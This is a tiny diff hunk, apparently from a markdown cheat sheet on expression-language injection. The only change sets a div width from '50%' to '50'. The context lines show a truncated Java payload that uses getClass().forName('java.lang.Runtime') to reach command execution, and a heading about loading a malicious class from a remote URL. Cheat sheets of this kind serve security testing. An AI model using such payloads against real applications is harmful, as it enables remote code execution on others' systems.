@@ -234,7 +234,7 @@ ${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6]
 
 **Method 6.**** Load Malicious.class** from remote URL [3]
 
-<div width="50%">
+<div width="50">
 
 
 ```
